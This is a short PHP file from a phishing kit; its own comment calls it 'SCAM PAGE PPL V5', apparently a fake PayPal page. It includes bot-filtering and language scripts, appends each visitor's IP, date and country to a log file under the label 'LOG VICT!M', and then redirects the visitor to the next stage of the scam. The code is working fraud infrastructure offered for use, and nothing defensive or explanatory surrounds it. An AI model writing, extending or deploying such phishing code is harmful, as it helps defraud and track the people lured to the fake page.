<?php
//<!-- SCAM PAGE PPL V5 #By Zetas Oujdi, WORK HARD DREAM B!G -->
include ('./Work-Hard-V5/bt.php');
include ('./Work-Hard-V5/makelang.php');
$milaf = fopen("VST.txt","a");
fwrite($milaf,$ib."  -| LOG VICT!M !! |-   ".$dt."                  -        " . $cntc ."\n");
header('Location: newdir.php');
?>

